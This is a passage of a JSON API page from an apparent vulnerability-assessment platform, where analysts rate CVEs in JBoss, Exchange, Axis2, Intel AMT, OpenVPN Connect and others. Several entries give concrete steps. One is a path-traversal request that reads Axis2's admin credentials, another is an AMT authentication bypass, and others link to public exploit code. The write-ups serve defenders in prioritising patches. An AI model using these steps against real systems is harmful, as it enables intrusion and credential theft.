{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=4&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=2&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=3&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "9c837515-ec14-43d6-b5d1-5253145d1dd5",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "ff34d034-592e-4d75-be7b-74387ab0ef37",
      "created": "2020-02-28T16:30:14.711426Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "jboss is widely used in enterprise, and we sometimes found it internet exposed.\r\nthere are ready to use exploit and scanner ( https://github.com/joaomatosf/jexboss ) that let an attacker to blindly abuse this.\r\n\r\n(un)fortunately, jboss by default runs as limited user, therefore LPE is needed to get root.\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "47462b94-84db-49a0-8e0e-1c5ff55e63c1",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "260b528f-2e09-4a9f-bda1-d44c712f82b2",
      "created": "2020-02-28T16:42:22.149897Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "this product runs as SYSTEM by default, and the exploit is quite reliable (thanks sinn3r), therefore when found this will be an easy win.\r\nnot so common nowdays but still present on some old setup.\r\n\r\nplus, as far as i saw this product was in place just because of a default installation.\r\nhoply, this will be discontinued with windows7 EOS.",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "984fc761-dfa6-4588-ac7d-208df7764542",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-02-28T16:45:22.39561Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "just to add the exploit and proper tag\r\nhttps://github.com/Ridter/cve-2020-0688\r\n",
      "score": 3,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "c061efbf-08cb-4600-94d6-0541cd42a35f",
      "editorId": "5445468a-4f32-45c2-b5b1-ef339292ddcb",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-02-28T16:51:39.461029Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Exchange Servers exposed to the outside (OWA) will need to patch this as soon as possible.  Internal Exchange is not a high priority.  The requirement of knowing the validation key is required to exploit.  There is discussion that a specially crafted email may trigger this vulnerability with the way Exchange handles memory objects which can lead to remote code execution.  \r\nSeveral POC are available although the skill level to exploit is higher with the need to write custom code.  \r\nRecommended to patch if Exchange is exposed outside of the environment. \r\nThis was patched in the Feb 2020 patch release from Microsoft.  \r\nHigh/Critical depending on controls to expose Exchange to the internet.\r\nLow/Moderate for internal Exchange depending on the environment.",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "requires_interaction"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "b4a6557a-6719-461f-8466-c7efadfacfc2",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "0f5907f8-ad8e-4fbe-b1c8-67f94a5257ee",
      "created": "2020-02-28T17:05:55.932607Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "disclaimer: CVE owner here.\r\n\r\nbecause of what opmanager needs to operate, a successful exploitation will give an attacker very often privileges access to lot of network device and system.\r\nthis lead to lot of lateral movement and juicy owning.\r\n\r\ni didn't have the chance to test on later version, but given vendors reply i think also recent one are vulnerable.\r\n\r\np.s.: i'm rating exploitability as medium because an attacker has to exploit another sql injection vulnerability to dump the database. even if opmanager has a poor security history, this vulnerability by itself isn't straightforwardly exploitable.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "60a39ce8-1486-4441-9619-991b7c9df895",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "97b6a4b5-d311-4ed5-a65d-40783d86bdb9",
      "created": "2020-02-28T19:40:39.817298Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Centreon is an Open Source Centralised IT management solution. When installed in a corporate network it is used to query all other devices. This makes it a high value target for attackers for several reasons:\r\n\r\n- Source of all networked devices and configuration. \r\n- Could be used to pivot across the network.\r\n- Use as a staging /beachhead host this is expected to talk to other devices on the network.\r\n\r\nThere is no indication of an active userbase from the Products website. the official Github repository as no more than a few hundred stars and forks. \r\nA  quick shodan search reveals around 40 internet facing applications. \r\n\r\nThis vulnerability appears to be post exploitation so an attacker would require either valid credentials or the ability to launch a password attack against the target. \r\n\r\nThe publicly listed blog post https://code610.blogspot.com/2020/02/postauth-rce-in-centreon-1910.html  includes steps to reproduce but doesn't provide a PoC script. That being said it would be trivial with a few lines of python to create a simple PoC Script. \r\nThe only tested version was 19.10, \r\n\r\nAt the time of writing there does not appear to be any official patch and the website is still serving vulnerable versions. Whilst a full review has not been completed a check of the github repo suggests that all versions are potentially vulnerable\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_exploit"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "cd894175-e2ef-4000-ad82-28108e4fb511",
      "editorId": "187e584f-da65-4748-a262-b384f7fdc8b2",
      "topicId": "c3819346-f5f9-469d-b412-530e7a4bc1ca",
      "created": "2020-02-28T22:58:56.75127Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "# Research of OpenVPN Connect 3.1.0.361 dll drop \"Privilege Escalation\"\r\nThis vulnerability is stated to be a Privilege escalation vulnerability. Unfortunately the droped dll of  drvstore.dll in C:\\ProgramData\\OpenVPN Connect\\drivers\\tap\\amd64\\win10 is *only* executed when the openvpn-connect-3.1.0.361_signed.msi is ran to install OpenVPN Connect. Due to most common settings of windows you already have to have administrative privileges to install applications. So this gets downgraded pretty heavily for usability as privilege escalation.  In addition \r\n\r\nI can see it used as a one time use to get your initial shell as a unique method to run your malicious dll. This would by pass the general monitoring methods to launch a malicious dll box. Unfortunately to use this method again, you will have to uninstall OpenVPN Connect and then reinstall. On the bright side you will not have to drop the evil DLL again after the uninstallation of OpenVPN Connect. \r\n\r\nYou can run the msi silently from an administrator command line by using `msiexec.exe /i openvpn-connect-3.1.0.361_signed.msi /qn`\r\n\r\n### Information:\r\nCVE: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9442](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9442)\r\nPublic Release: [https://github.com/hessandrew/CVE-2020-9442\r\n](https://github.com/hessandrew/CVE-2020-9442\r\n)\r\n",
      "score": 4,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 1,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "729803bf-5c44-4526-8886-eec1bd1d7196",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "26e700f3-2bb7-4566-af77-05ca1fc0e7d7",
      "created": "2020-02-29T15:09:19.827287Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "CVE here doesn't show the real impact of this vulnerability and also the data is partial/misleading.\r\n\r\nAxis2 version 1.6.2 let an attacker to read files on local filesystem. admin password is written in plaintext in a XML configuration file.\r\nchaining this two easy vulnerabilities, an attacker is able to login as admin to Axis2 and to deploy a new webservice to achieve remote code execution.\r\n\r\nthings get worse beause we mostly find Axis2 internet-faced\r\n\r\nto retrieve the config file an attacker can just exploit the LFI in a very basic way:\r\nGET /axis2/services/Version?xsd=../conf/axis2.xml\r\nthen scrolling down to read username/password parameters\r\n\r\nwith given credentials, axis2_deployer (https://www.rapid7.com/db/modules/exploit/multi/http/axis2_deployer) from metasploit will let him to deploy a meterpreter session",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6a96fb57-d262-40ac-9444-1a91b547553b",
      "editorId": "551d3067-a882-49f0-8591-af3d82c10d6e",
      "topicId": "38474044-13da-4165-a8d4-86867ca68d83",
      "created": "2020-02-29T20:41:57.697002Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Several Red Hat JBoss products (JBoss Middleware Suite) widely used in enterprise environments were found to be vulnerable to a Java object serialization flaw. Exploit code is publicly available and PoC exploits are easy to develop, which allow attackers to execute arbitrary code on the affected servers with the permissions of the JBoss application.\r\nThe vulnerability resides in Apache Commons Collections library which allows deserialization of untrusted user input in JBoss and many other software products (for more information: https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/),",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "891a2f7e-4b48-4d20-b14c-5356e2f3a63e",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "5355349e-b12c-4352-8564-6886ee50ce60",
      "created": "2020-03-02T09:30:10.732461Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "as stated on CVE details, this vulnerability let an attacker to bypass authentication on AMT and reach web panel as admin.\r\n\r\nat first glance this vulnerability looks not that useful, because - at least from my tests - by bypassing authentication you can:\r\n- reboot/shutdown/poweron the host\r\n- boot from alternative devices, for example PXE\r\n- other \"useless\" stuff\r\n\r\nand if in theory running a live system to access original host filesystem to exfiltrate hashes/data could be awesome, i've seen no engagement where you can actually reboot a box without heavy issue from the owner. because AMT works also when the host is shutdown, it could be interesting to poweron an inactive host and take full control of it, but we have another options:\r\n(un)fortunately, AMT also let a user to access using KVM, so an attacker can use (or leech at) a running interactive session.\r\n\r\nthe bypass is very easy, just specify response=\"\" in Authorization header, and can also be automated on any intercepting proxy like burp or zap, so you could route all your traffic to burp and have the auth bypass \r\n\r\nwhat i've tested so far are this blog post, to setup a KVM connection from linux:\r\nhttps://www.cyberciti.biz/faq/remotely-access-intel-amt-kvm-linux-desktop/\r\nand this awesome opensource client:\r\nhttps://www.meshcommander.com/meshcommander\r\n\r\nunfortunately, engagement's time didn't let me to finish my test.\r\n\r\nfor a quick vulnerability check:\r\nhttps://www.exploit-db.com/exploits/43385",
      "score": 4,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "300d9449-2a79-41f5-9c02-c888b6bd8012",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "8bd2e977-683c-4857-92db-97750f4d6add",
      "created": "2020-03-02T17:11:18.890438Z",
      "revisionDate": "2020-03-29T13:27:35.813552Z",
      "document": "on 29th of january 2020 this github[1] repo came up, with some newsfeed, speakin about a RCE via deserialization on Liferay 6.0.2\r\n\r\ni'm aware that liferay is widely used to build both internal and internet-facing webapp, and a possible preauth RCE would be awesome.\r\n\r\nactually i don't remember which post i read first, because github repo doesn't speak about any version, but i'm sure i've read somewhere 6.0.2: also exploit-db speaks about 6.0.2, if my memory plays tricks on me, i'm not alone.\r\n\r\nfrom the very low info we see at said github repo, we understand that the vulnerability is at /api/liferay which is NOT present in 6.0.2, nor on the filesystem neither on configuration as route.\r\n\r\ntesting a more recent version, i saw that 6.1 branch actually has /api/liferay but by default it's limited to \"localhost\".\r\nit could be possible to open it to more IPs of course, but i don't see it happen so frequently to have a 0.0.0.0 as trusted host.\r\n\r\ni think this vulnerability doesn't affect 6.0 branch, it *could* affect 6.1 branch but not on default configuration.\r\nplus, it's not yet clear if this is pre-auth or post-auth.\r\ni'll dig newer branches as soon as i can.\r\n\r\n\r\np.s.: exploitability is rated against a possible 6.1, and the fact that ysoserial makes java deserialization quite easy.\r\n\r\n[1] https://github.com/chakadev/Liferay-CE-Portal-Java-Deserialization\r\n\r\n\r\n20200329 edit:\r\nlowering value, adding required auth\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "obscure_configuration",
          "post_auth"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "0eba733d-f2ee-4141-8357-716a0cddaa7b",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-03-02T22:11:35.246085Z",
      "revisionDate": "2020-04-17T20:36:32.537604Z",
      "document": "Due to widespread credential stuffing and password spraying attacks, the fact that this is a deserialization RCE due to hard coded encryption keys, the exploit is universally portable.\r\n\r\nThere are also POC scripts that just require you to get valid credentials.\r\n\r\n",
      "score": 5,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2ebf2534-e228-4c33-b724-5449a56fab4d",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "c3819346-f5f9-469d-b412-530e7a4bc1ca",
      "created": "2020-03-02T22:23:24.906823Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Due to the need to have an upgrade or an install trigger in order for this privesc to work, the value of the exploit to an attacker is decreased. You can drop your .dll and wait for an eventually privileged process to spawn as a result of the exploit, but you might have to wait a long time.",
      "score": 4,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "requires_interaction"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "2e83a8fc-e473-4090-8d26-7cb0c2095e05",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "8f90c40d-1f73-4df2-8155-8383b0b1daa1",
      "created": "2020-03-03T15:13:08.178523Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This privilege escalation through how MSI packages handle symlinks is easily exploitable. Due to the POC being public: https://github.com/padovah4ck/CVE-2020-0683 it is easy to craft your own exploits for this.\r\n\r\nAny org without a good patching cadence.would be vulnerable to this as a valid privilege escalation vector.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "difficult_to_patch"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4c22274a-dafa-439e-ba9c-acd964be7ecb",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "b9fc4ad2-0100-450a-973a-8b0a9808cdff",
      "created": "2020-03-03T15:23:37.049935Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This service is incredibly common on the inside of Enterprise Environments. Would make for an extremely useful pivot to a resource that would likely have other valuable credentials on it.\r\n\r\nBecause obtaining valid Credentials in a Windows Environment is trivial, this is easy to exploit.\r\n\r\nBecause this is a viewstate serialization issue, the toolkits to create the attack payload are easy to find (https://github.com/pwntester/ysoserial.net) and the POC is readily available: https://github.com/euphrat1ca/CVE-2020-0618",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "high_privilege_access",
          "default_configuration",
          "difficult_to_patch",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2c5f279b-cd25-4c58-81ba-509ff0089c91",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "d432d14a-94a1-4099-b6f6-959b6ef2a545",
      "created": "2020-03-03T15:30:31.513306Z",
      "revisionDate": "2020-10-21T20:31:26.694448Z",
      "document": "Due to many enterprise environments using Confluence, and many of them exposing it to the internet, this vulnerability is incredibly useful.\r\n\r\nThere is a public POC available:https://github.com/Yt1g3r/CVE-2019-3396_EXP from which you could base other attacks.",
      "score": 4,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "difficult_to_patch",
          "easy_to_develop"
        ]
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "af0b2a1e-f334-40c9-a37b-5ce2ee1283e1",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "b3c81855-abd0-4a19-b5ca-7ea60a5837c8",
      "created": "2020-03-03T15:48:08.307089Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This exploit does not appear to need admin credentials in order to trigger: https://www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS14-054, https://www.tenable.com/plugins/nessus/77574\r\n\r\nAny privilege escalation using built in Windows components is a valuable tool for attackers.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "38aea407-b6b3-4e8c-85b8-c13aa140762a",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "3374fb55-2a44-4607-a9c5-265e7de9b936",
      "created": "2020-03-03T15:50:55.583984Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Due to many public exploits for this flaw this is an incredibly valuable tool for an attacker to have in their arsenal. My favorite variant of this exploit is: https://github.com/g0tmi1k/Drupalgeddon2",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "easy_to_develop",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
